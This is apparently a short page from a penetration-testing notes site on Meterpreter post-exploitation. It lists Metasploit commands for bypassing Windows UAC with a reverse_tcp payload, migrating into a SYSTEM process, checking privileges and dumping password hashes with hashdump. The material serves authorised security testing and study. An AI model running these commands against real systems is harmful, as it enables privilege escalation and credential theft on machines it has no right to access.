---
layout: default
title: Meterpreter
parent: Post-Admin/Root
---

# Meterpreter
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Bypass UAC
Uploads shell in context that is not restricted by UAC
```shell
background             # Background session
use exploit/windows/local/bypassuac
set SESSION <session>
set PAYLOAD <payload>  # e.g. windows/meterpreter/reverse_tcp
# Setup necessary payload parameters
run
```

## Migrating Processes
```shell
ps  # Note the PID of process that runs under NT AUTHORITY\SYSTEM
migrate <PID>
```

## Useful Commands
```shell
getprivs  # Check privileges; can be expanded via bypassuac
getuid    # Check user
hashdump  # Requires SYSTEM privileges
```
